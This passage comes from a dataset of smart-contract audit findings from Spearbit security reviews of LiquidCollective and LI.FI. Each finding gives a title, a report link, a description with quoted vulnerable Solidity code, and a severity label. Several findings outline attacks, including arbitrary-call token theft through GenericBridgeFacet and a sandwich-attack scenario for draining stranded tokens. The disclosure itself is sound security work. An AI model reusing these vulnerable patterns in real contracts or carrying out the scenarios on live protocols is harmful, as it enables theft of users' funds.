["Spearbit", "LiquidCollectivePR", "Severity: Informational"]}, {"title": "It might take longer than 2 years to release all the vested schedule amount after the lock period ends", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf", "body": "It is possible that in the presence of the global lock, releasing the total vested value might take longer than 2 years if the lockDuration + 2 years is comparatively small when compared to duration (or start - end). We just know that after 2 years all the scheduled amount can be released but only a portion of it might have been vested.", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Informational"]}, {"title": "_computeVestingReleasableAmount's_time input parameter can be removed/inlined", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review-Sept.pdf", "body": "At both call sites to _computeVestingReleasableAmount(...), time is _getCurrentTime().", "labels": ["Spearbit", "LiquidCollectivePR", "Severity: Informational"]}, {"title": "Hardcode bridge addresses via immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Most bridge facets call bridge contracts where the bridge address has been supplied as a parameter. This is inherently unsafe because any address could be called. Luckily, the called function signature is hardcoded, which reduces risk. However, it is still possible to call an unexpected function due to the potential collisions of function signatures. Users might be tricked into signing a transaction for the LiFi protocol that calls unexpected contracts. One exception is the AxelarFacet which sets the bridge addresses in initAxelar(), however this is relatively expensive as it requires an SLOAD to retrieve the bridge addresses. Note: also see \"Facets approve arbitrary addresses for ERC20 tokens\". function startBridgeTokensViaOmniBridge(..., BridgeData calldata _bridgeData) ... { ... _startBridge(_lifiData, _bridgeData, _bridgeData.amount, false); } function _startBridge(..., BridgeData calldata _bridgeData, ...) ... { IOmniBridge bridge = IOmniBridge(_bridgeData.bridge); if (LibAsset.isNativeAsset(_bridgeData.assetId)) { bridge.wrapAndRelayTokens{ ... }(...); } else { ... bridge.relayTokens(...); } ... } contract AxelarFacet { function initAxelar(address _gateway, address _gasReceiver) external { ... s.gateway = IAxelarGateway(_gateway); s.gasReceiver = IAxelarGasService(_gasReceiver); } function executeCallViaAxelar(...) ... { ... s.gasReceiver.payNativeGasForContractCall{ ... }(...); s.gateway.callContract(destinationChain, destinationAddress, payload); } }", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "Tokens are left in the protocol when the swap at the destination chain fails", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "LiFi protocol finds the best bridge route for users. In some cases, it helps users do a swap at the destination chain. With the help of the bridge protocols, LiFi protocol helps users trigger swapAndComplete- BridgeTokensVia{Services} or CompleteBridgeTokensVia{Services} at the destination chain to do the swap. Some bridge services will send the tokens directly to the receiver address when the execution fails. For example, Stargate, Amarok and NXTP do the external call in a try-catch clause and send the tokens directly to the receiver If the receiver is the Executor contract, when it fails. The tokens will stay in the LiFi protocols in this scenario. users can freely pull the tokens. Note: Exploiters can pull the tokens from LiFi protocol, Please refer to the issue Remaining tokens can be sweeped from the LiFi Diamond or the Executor , Issue #82 Exploiters can take a more aggressive strategy and force the victims swap to revert. A possible exploit scenario:  A victim wants to swap 10K optimisms BTC into Ethereum mainnet USDC.  Since dexs on mainnet have the best liquidity, LiFi protocol helps users to the swap on mainnet  The transaction on the source chain (optimism) suceed and the Bridge services try to call Complete- BridgeTokensVia{Services} on mainnet.  The exploiter builds a sandwich attack to pump the BTC price. The CompleteBridgeTokens fails since the price is bad.  The bridge service does not revert the whole transaction. Instead, it sends the BTC on the mainnet to the receiver (LiFi protocol).  The exploiter pulls tokens from the LiFi protocol.", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "Tokens transferred with Axelar can get lost if the destination transaction cant be executed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "If _executeWithToken() reverts then the transaction can be retried, possibly with additional gas. See axelar recovery. However there is no option to return the tokens or send them elsewhere. This means that tokens would be lost if the call cannot be made to work. contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _executeWithToken(...) ... { ... (bool success, ) = callTo.call(callData); if (!success) revert ExecutionFailed(); } }", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "Use the getStorage() / NAMESPACE pattern instead of global variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The facet DexManagerFacet and the inherited contracts Swapper.sol / SwapperV2.sol define a global variable appStorage on the first storage slot. These two overlap, which in this case is intentional. However it is dangerous to use this construction in a Diamond contract as this uses delegatecall. If any other contract uses a global variable it will overlap with appStorage with unpredictable results. This is especially impor- tant because it involves access control. For example if the contract IAxelarExecutable.sol were to be inherited in a facet, then its global variable gateway would overlap. Luckily this is currently not the case. contract DexManagerFacet { ... LibStorage internal appStorage; ... } contract Swapper is ILiFi { ... LibStorage internal appStorage; // overlaps with DexManagerFacet which is intentional ... }", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "Decrease allowance when it is already set a non-zero value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Non-standard tokens like USDT will revert the transaction when a contract or a user tries to approve an allowance when the spender allowance is already set to a non zero value. For that reason, the previous allowance should be decreased before increasing allowance in the related function.  Performing a direct overwrite of the value in the allowances mapping is susceptible to front-running scenarios by an attacker (e.g., an approved spender). As an Openzeppelin mentioned, safeApprove should only be called when setting an initial allowance or when resetting it to zero. 9 function safeApprove( IERC20 token, address spender, uint256 value ) internal { // safeApprove should only be called when setting an initial allowance, // or when resetting it to zero. To increase and decrease it, use // 'safeIncreaseAllowance' and 'safeDecreaseAllowance' require( (value == 0) || (token.allowance(address(this), spender) == 0), \"SafeERC20: approve from non-zero to non-zero allowance\" ); _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value)); } There are four instance of this issue:  AxelarFacet.sol is directly using approve function which does not check return value of an external function. The faucet should utilize LibAsset.maxApproveERC20() function like the other faucets.  LibAsset s LibAsset.maxApproveERC20() function is used on the other faucets. For instance, USDTs ap- proval mechanism reverts if current allowance is nonzero. From that reason, the function can approve with zero first or safeIncreaseAllowance can be utilized.  FusePoolZap.sol is also using approve function which does not check return value . The contract does not import any other libraries, that being the case, the contract should use safeApprove function with approving zero.  Executor.sol is directly using approve function which does not check return value of an external function. The contract should utilize LibAsset.maxApproveERC20() function like the other contracts.", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "Too generic calls in GenericBridgeFacet allow stealing of tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "With the contract GenericBridgeFacet, the functions swapAndStartBridgeTokensGeneric() (via LibSwap.swap()) and _startBridge() allow arbitrary functions calls, which allow anyone to call transferFrom() and steal tokens from anyone who has given a large allowance to the LiFi protocol. This has been used to hack LiFi in the past. The followings risks also are present:  call the Lifi Diamand itself via functions that dont have nonReentrant.  perhaps cancel transfers of other users.  call functions that are protected by a check on this, like completeBridgeTokensViaStargate. 10 contract GenericBridgeFacet is ILiFi, ReentrancyGuard { function swapAndStartBridgeTokensGeneric( ... LibSwap.swap(_lifiData.transactionId, _swapData[i]); ... } function _startBridge(BridgeData memory _bridgeData) internal { ... (bool success, bytes memory res) = _bridgeData.callTo.call{ value: value ,! }(_bridgeData.callData); ... } } library LibSwap { function swap(bytes32 transactionId, SwapData calldata _swapData) internal { ... (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue ,! }(_swapData.callData); ... } }", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}]